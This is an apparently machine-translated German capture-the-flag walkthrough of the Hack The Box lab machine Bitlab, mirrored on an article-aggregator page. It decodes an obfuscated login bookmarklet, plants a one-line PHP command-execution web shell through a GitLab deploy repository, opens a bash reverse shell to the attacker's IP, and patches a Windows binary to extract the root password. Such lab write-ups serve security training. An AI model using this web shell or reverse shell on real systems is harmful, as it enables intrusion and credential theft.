<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üà∏ üè£ üïû Hack The Box - Bitlab-Komplettl√∂sung. Schwache JS-Verschleierung, GIT und umgekehrte Windows-Anwendungen üì© üîë üî¥</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="In diesem Artikel beginne ich mit der Ver√∂ffentlichung von L√∂sungen, die von der HackTheBox- Site zur weiteren Verarbeitung gesendet wurden. Ich hoffe...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Hack The Box - Bitlab-Komplettl√∂sung. Schwache JS-Verschleierung, GIT und umgekehrte Windows-Anwendungen</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/483646/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/lb/gt/fk/lbgtfkwlreiii6fg3o2nz_pt7-u.png" alt="Bild"></div><br>  In diesem Artikel beginne ich mit der Ver√∂ffentlichung von L√∂sungen, die von der <a href="https://www.hackthebox.eu/">HackTheBox-</a> Site zur <a href="https://www.hackthebox.eu/">weiteren Verarbeitung gesendet</a> wurden.  Ich hoffe, dass dies zumindest jemandem hilft, sich auf dem Gebiet der Informationssicherheit weiterzuentwickeln.  In diesem Artikel werden wir uns mit ein wenig JavaScript-Verschleierung befassen, die Backdoor √ºber das Git-Repository laden und die 32-Anwendung debuggen. <br><br>  Die Verbindung zum Labor erfolgt √ºber VPN.  Es wird empfohlen, keine Verbindung von einem Arbeitscomputer oder einem Host herzustellen, auf dem die f√ºr Sie wichtigen Daten verf√ºgbar sind, da Sie in einem privaten Netzwerk mit Personen enden, die sich mit dem Thema Informationssicherheit auskennen :) <br><br><div class="spoiler">  <b class="spoiler_title">Organisatorische Informationen</b> <div class="spoiler_text">  Speziell f√ºr diejenigen, die etwas Neues lernen und sich in einem der Bereiche Informations- und Computersicherheit weiterentwickeln m√∂chten, werde ich folgende Kategorien beschreiben und besprechen: <br><br><ul><li>  PWN; </li><li>  Kryptographie (Crypto); </li><li>  Netzwerktechnologien (Netzwerk); </li><li>  Reverse (Reverse Engineering); </li><li>  Steganographie (Stegano); </li><li>  Suche und Ausnutzung von WEB-Schwachstellen. </li></ul><br>  Dar√ºber hinaus werde ich meine Erfahrungen in den Bereichen Computerforensik, Analyse von Malware und Firmware, Angriffe auf drahtlose Netzwerke und lokale Netzwerke, Durchf√ºhrung von Pentests und Schreiben von Exploits teilen. <br><a name="habracut"></a><br>  Damit Sie sich √ºber neue Artikel, Software und andere Informationen informieren k√∂nnen, habe ich <a href="https://t.me/RalfHackerChannel">in Telegram</a> einen <a href="https://t.me/RalfHackerChannel">Channel</a> und eine <a href="https://t.me/RalfHackerPublicChat">Gruppe erstellt, um alle Fragen</a> im Bereich ICD <a href="https://t.me/RalfHackerPublicChat">zu diskutieren</a> .  Au√üerdem werde ich Ihre pers√∂nlichen W√ºnsche, Fragen, Vorschl√§ge und Empfehlungen pers√∂nlich ber√ºcksichtigen <a href="https://t.me/hackerralf8">und auf alle antworten</a> . <br><br>  Alle Informationen werden nur zu Bildungszwecken bereitgestellt.  Der Autor dieses Dokuments √ºbernimmt keine Verantwortung f√ºr Sch√§den, die jemandem durch die Verwendung von Kenntnissen und Methoden entstehen, die er durch das Studium dieses Dokuments erlangt hat. <br></div></div><br><h2>  Intelligenz </h2><br><h3>  Port-Scan </h3><br>  Dieser Computer hat eine IP-Adresse vom 10.10.10.114, die ich zu / etc / hosts hinzuf√ºge. <br> <code>10.10.10.114 bitlab.htb</code> <br>  Zuerst scannen wir offene Ports.  Da es sehr lange dauert, alle Ports mit nmap zu scannen, mache ich dies zuerst mit Masscan.  Wir scannen alle TCP- und UDP-Ports von der tun0-Schnittstelle mit einer Geschwindigkeit von 1000 Paketen pro Sekunde. <br> <code>masscan -e tun0 -p1-65535,U:1-65535 10.10.10.114 --rate=1000</code> <br> <br><img src="https://habrastorage.org/webt/or/ty/cm/ortycmbvp8d-g6dh8j5p06zvl-a.png" alt="Bild"><br><br>  Als N√§chstes m√ºssen Sie weitere Informationen zu den uns bekannten Ports sammeln. <br> <code>nmap -A bitlab.htb -p22,80</code> <br> <br><img src="https://habrastorage.org/webt/mj/xq/oj/mjxqoj4wzsud45mgn2cl1pp6gwq.png" alt="Bild"><br><br>  Wie aus dem nmap-Bericht hervorgeht, werden SSH und ein Webserver auf dem Host ausgef√ºhrt.  Und auf dem Webserver gibt es robots.txt.  Nachdem wir die Verzeichnisse aus dieser Liste durchgesehen haben, stellen wir fest, dass gitlab funktioniert und es ein nicht indiziertes Hilfeverzeichnis gibt. <br><br><img src="https://habrastorage.org/webt/bb/z9/sd/bbz9sdv75mwcqbf58f6g4odcnj4.png" alt="Bild"><br><br>  Auf der Seite mit den Lesezeichen befinden sich mehrere Links. <br><br><img src="https://habrastorage.org/webt/yw/dk/20/ywdk20gxveb0sukmjq8sl1ce9hw.png" alt="Bild"><br><br><h3>  Js </h3><br>  Alle zeigen auf die Site eines Produkts, mit Ausnahme der letzten, die keine Adresse, sondern einen JS-Code enth√§lt. <br><br><img src="https://habrastorage.org/webt/lz/b0/4r/lzb04rvftjgmznjahwlf4iqh0yu.png" alt="Bild"><br><br>  Was hat dieser Code verschleiert. <br><pre> <code class="javascript hljs">javascript:(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> _0x4b18=[<span class="hljs-string"><span class="hljs-string">"\x76\x61\x6C\x75\x65"</span></span>,<span class="hljs-string"><span class="hljs-string">"\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E"</span></span>,<span class="hljs-string"><span class="hljs-string">"\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64"</span></span>,<span class="hljs-string"><span class="hljs-string">"\x63\x6C\x61\x76\x65"</span></span>,<span class="hljs-string"><span class="hljs-string">"\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64"</span></span>,<span class="hljs-string"><span class="hljs-string">"\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78"</span></span>];<span class="hljs-built_in"><span class="hljs-built_in">document</span></span>[_0x4b18[<span class="hljs-number"><span class="hljs-number">2</span></span>]](_0x4b18[<span class="hljs-number"><span class="hljs-number">1</span></span>])[_0x4b18[<span class="hljs-number"><span class="hljs-number">0</span></span>]]= _0x4b18[<span class="hljs-number"><span class="hljs-number">3</span></span>];<span class="hljs-built_in"><span class="hljs-built_in">document</span></span>[_0x4b18[<span class="hljs-number"><span class="hljs-number">2</span></span>]](_0x4b18[<span class="hljs-number"><span class="hljs-number">4</span></span>])[_0x4b18[<span class="hljs-number"><span class="hljs-number">0</span></span>]]= _0x4b18[<span class="hljs-number"><span class="hljs-number">5</span></span>]; })()</code> </pre> <br>  Um einen besser lesbaren Code zu erhalten, k√∂nnen Sie die <a href="http://jsnice.org/">folgende Site verwenden</a> . <br><br><img src="https://habrastorage.org/webt/rt/ok/qn/rtokqngrjsuxcz5teijziyx3l-q.png" alt="Bild"><br><br>  Nach einer kleinen Verbesserung des Codes erhalten wir die folgenden Anweisungen. <br><pre> <code class="javascript hljs"><span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.getElementById(<span class="hljs-string"><span class="hljs-string">"user_login"</span></span>).value = <span class="hljs-string"><span class="hljs-string">"clave"</span></span>; <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.getElementById(<span class="hljs-string"><span class="hljs-string">"user_password"</span></span>).value = <span class="hljs-string"><span class="hljs-string">"11des0081x"</span></span>;</code> </pre> <br><h3>  Git </h3><br>  Mit diesen Authentifizierungsdaten sind wir in gitlab autorisiert.  Dort finden wir zwei Profile. <br><br><img src="https://habrastorage.org/webt/at/oc/na/atocnanfa4yjiqva3o1pctdmhmk.png" alt="Bild"><br><br>  Sie k√∂nnen auch ein Projekt finden, in dem eine Verbindung zur Datenbank besteht, in dem Code stelle ich alle Daten f√ºr die Verbindung vor. <br><br><img src="https://habrastorage.org/webt/qb/xp/lx/qbxplx4mzgp8_1vv2rdag82wn4i.png" alt="Bild"><br><br>  Beim √úberpr√ºfen des Profils finden wir nichts interessantes. <br><br><img src="https://habrastorage.org/webt/yw/58/46/yw5846lufr9c2fgxl2vqdqwjdqy.png" alt="Bild"><br><br>  Deployer hat nur PHP-Code. <br><br><img src="https://habrastorage.org/webt/su/x1/zo/sux1zou0txfcgbmq9w1pu7snb6q.png" alt="Bild"><br><br>  Aus diesem Code wird deutlich, dass eine im Profil platzierte Datei auf dem Server bereitgestellt wird. <br><br><h2>  Einstiegspunkt </h2><br>  Wir m√ºssen eine PHP-Backdoor platzieren.  Zum Beispiel eine, die Befehle empf√§ngt und ausf√ºhrt. <br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> $cmd = $_REQUEST[<span class="hljs-string"><span class="hljs-string">'cmd'</span></span>]; system($cmd); <span class="hljs-keyword"><span class="hljs-keyword">die</span></span>; <span class="hljs-meta"><span class="hljs-meta">?&gt;</span></span></code> </pre> <br>  √ñffnen Sie dazu Profile und erstellen Sie eine neue Datei. <br><br><img src="https://habrastorage.org/webt/fm/1q/ci/fm1qcijvlbn2xeg1mlspaiu2jr8.png" alt="Bild"><br><br><img src="https://habrastorage.org/webt/mn/zn/g9/mnzng9pv1x377k6ehdgt4xbgrvw.png" alt="Bild"><br><br>  Und nach dem Hinzuf√ºgen unserer Datei wird im Repository angezeigt. <br><br><img src="https://habrastorage.org/webt/qq/m6/gz/qqm6gzbtb9hauhdzoyghv4wns1w.png" alt="Bild"><br><br>  Jetzt testen wir die Hintert√ºr. <br><br><img src="https://habrastorage.org/webt/mm/6m/4e/mm6m4e_q-ts8eaeqaanmfeo3azq.png" alt="Bild"><br><br>  Jetzt bekommen wir eine volle Schale. <br><pre> <code class="bash hljs">bash -i &gt;&amp; /dev/tcp/10.10.15.150/4321 0&gt;&amp;1</code> </pre> <br><img src="https://habrastorage.org/webt/r6/cm/z3/r6cmz3sanccb0quh8fc6isggyu0.png" alt="Bild"><br><br>  Und wir sehen die umgekehrte Verbindung zu unserem Gastgeber. <br><br><img src="https://habrastorage.org/webt/iu/oy/xw/iuoyxwi2boaat_lmbem7v1hh4es.png" alt="Bild"><br><br><h2>  USER </h2><br>  Sobald Sie sich auf dem Host befinden, m√ºssen Sie die zuvor gekauften Daten unbedingt √ºberpr√ºfen.  Dies sind die Daten, um auf die Datenbank zuzugreifen. <br><br>  Interaktives √ñffnen des PHP-Interpreters.  Wir verwenden den gefundenen Code und durchsuchen die gefundenen Daten.  Benutzerkennwort in base64, dekodiere es. <br><br><img src="https://habrastorage.org/webt/fz/ms/ch/fzmschfqgswgjxhlph2hr-rgir0.png" alt="Bild"><br><br>  Also finden wir das Passwort heraus, das sich anscheinend √ºber SSH verbinden kann.  Das hat aber nicht geklappt, da base64 das Passwort ist)). <br><br><img src="https://habrastorage.org/webt/x8/ge/6x/x8ge6xsrpcp2pfh-x9kzk1d3yim.png" alt="Bild"><br><br><h2>  Wurzel </h2><br>  Wenn wir uns im Auto umsehen, finden wir eine exe-Datei im Home-Verzeichnis des Benutzers. <br><br><img src="https://habrastorage.org/webt/10/be/gr/10begrcdwcjnso7n1ojmzl4tf-g.png" alt="Bild"><br><br>  Wir kopieren es zur Analyse auf unseren Host. <br><pre> <code class="bash hljs">scp clave@10.10.10.114:~/RemoteConnection.exe .</code> </pre> <br>  √ñffnen Sie anschlie√üend die Datei in IDA Pro.  Scrollen Sie durch die Hauptfunktion main, finden Sie einen Vergleich der Variablen mit dem Benutzernamen und erstellen Sie einen Prozess mit putty - einem Programm f√ºr Netzwerkverbindungen. <br><br><img src="https://habrastorage.org/webt/r1/oi/kp/r1oikpihtg3jattyr-davo5todo.png" alt="Bild"><br><br>  Wir k√∂nnen davon ausgehen, dass die Verbindung mit der Bereitstellung von Authentifizierungsdaten hergestellt wird und m√ºssen diese finden.  Verbindungsdaten werden als Parameter √ºbergeben, d. H.  Variable v3. <br><br>  Sie k√∂nnen die fertige Zeile w√§hrend des Debuggens sehen, aber in der IDA st√ºrzt die 32-Bit-Datei ab.  Wenn wir Schritt f√ºr Schritt debuggen, verstehen wir, dass dies nach dem Aufruf von GetUserNameW geschieht.  Wir gehen wie folgt vor. <br><br>  Setzen Sie BP auf das Namensvergleichsfragment. <br><br><img src="https://habrastorage.org/webt/_m/jo/m4/_mjom4cmdotltqy2wn7olxo6ank.png" alt="Bild"><br><br>  Jetzt setzen wir BP vor dem Laden der Parameter f√ºr die Funktion GetUserNameW. <br><br><img src="https://habrastorage.org/webt/st/wz/er/stwzer7wy5tdfnyapjb2grsq3wo.png" alt="Bild"><br><br>  F√ºhren Sie das Programm im Debugger aus.  Das Debuggen wird beendet, bevor die von uns ben√∂tigte Funktion aufgerufen wird. <br><br><img src="https://habrastorage.org/webt/nj/i7/i5/nji7i5b9udqhxwyxjarz5f7yank.png" alt="Bild"><br><br>  Jetzt den Code patchen.  Anstatt die Parameter zu laden und die Funktion aufzurufen, m√ºssen Sie den NOP-Befehl eingeben.  Ich benutze daf√ºr das Keypatch-Plugin. <br><br><img src="https://habrastorage.org/webt/ya/_e/sf/ya_esfz8x63uzkcpozssfztqmyc.png" alt="Bild"><br><br>  Jetzt sieht der Code so aus. <br><br><img src="https://habrastorage.org/webt/px/lr/3i/pxlr3i05e-qkpkbhfqbcug67gea.png" alt="Bild"><br><br>  Lassen Sie uns mit dem Debuggen des Programms fortfahren, damit der Name nicht mehr verglichen wird.  Zu diesem Zeitpunkt ist die Adresse der Parameterzeichenfolge bereits in das EAX-Register geladen, um als ShellExecuteW-Parameter √ºbergeben zu werden. <br><br><img src="https://habrastorage.org/webt/ea/kb/xk/eakbxkkjzrqlcof5fkgf5sfn6by.png" alt="Bild"><br><br>  Klicken Sie nun auf den Pfeil (Sprung in die Demontage) neben dem EAX-Register.  Auf diese Weise k√∂nnen Sie im IDA-Hauptfenster zur Adresse von EAX wechseln. <br><br><img src="https://habrastorage.org/webt/s5/-z/nc/s5-zncikj0g5tmdiyh5niad0hbo.png" alt="Bild"><br><br>  Diese Adresse enth√§lt die Parameterzeichenfolge.  Wie Sie sehen, enth√§lt es den symmetrisch korrekten Text ‚Äû-ssh root ...‚Äú.  Jedes Zeichen wird jedoch durch 2 Bytes dargestellt.  Dr√ºcken Sie Alt + A, um die Zeichenfolge bequem zu sammeln. <br><br><img src="https://habrastorage.org/webt/ob/vq/4n/obvq4newyoobvjcixwyhcj439qi.png" alt="Bild"><br><br>  W√§hlen Sie in diesem Fenster Unicode C-Style (16 Bit).  Dann beobachten wir die richtig zusammengesetzte Saite. <br><br><img src="https://habrastorage.org/webt/5_/n2/dq/5_n2dqpvmmfb49db2xptyskxdbu.png" alt="Bild"><br><br>  Diese Zeile enth√§lt das root-Passwort.  Wir verbinden uns per ssh und holen den Token ab. <br><br><img src="https://habrastorage.org/webt/m4/8y/ma/m48ymaikjvxt9hpgeqw1t-xcxga.png" alt="Bild"><br><br>  Sie k√∂nnen sich uns <a href="https://t.me/RalfHackerChannel">per Telegramm anschlie√üen</a> .  Bauen wir eine Community auf, in der es Menschen geben wird, die sich in vielen Bereichen der IT auskennen. Dann k√∂nnen wir uns gegenseitig in allen Fragen der IT- und Informationssicherheit helfen. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de483646/">https://habr.com/ru/post/de483646/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de483624/index.html">Wettbewerb von Yandex.Taxi: Analyse des Backend-Tracks der Programmiermeisterschaft</a></li>
<li><a href="../de483626/index.html">Wie man einen 100-Gitlab-Job in 100 Zeilen auf Jsonnet beschreibt</a></li>
<li><a href="../de483628/index.html">Codegenerierung von OpenAPI v3 (auch bekannt als Swagger 3) bis TypeScript und nicht nur</a></li>
<li><a href="../de483630/index.html">The Ember Times - Ausgabe 130</a></li>
<li><a href="../de483634/index.html">Min und Max Breite / H√∂he Eigenschaften in CSS</a></li>
<li><a href="../de483648/index.html">Offshore f√ºr IT-Business in Georgia: Life Hacks und Fallstricke</a></li>
<li><a href="../de483650/index.html">Kosmodrome n√§her am √Ñquator - Wenchang Tropical Cosmodrome</a></li>
<li><a href="../de483652/index.html">L√ºg mich an, wenn du kannst: Merkmale des soziotechnischen Pentests</a></li>
<li><a href="../de483654/index.html">Feedback in Rallyes, eins zu eins, warum es m√∂glicherweise nicht funktioniert und wie versucht man es zu beheben?</a></li>
<li><a href="../de483656/index.html">Tableau im Einzelhandel, wirklich?</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>